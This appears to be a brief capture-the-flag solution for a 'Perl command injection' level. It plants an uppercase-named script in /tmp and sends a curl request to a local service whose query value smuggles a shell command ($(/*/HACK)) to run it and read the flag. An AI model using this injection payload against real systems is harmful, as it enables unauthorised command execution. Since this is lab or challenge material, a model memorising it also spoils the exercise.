# Perl command injection 2
## Create a script to execute with an uppercase name
>`echo '/bin/getflag > /tmp/flag' > /tmp/HACK && chmod 777 /tmp/HACK`

## Send query
>`curl 'localhost:4646/?x=$(/*/HACK)'`

## Get the flag
>`cat /tmp/flag`
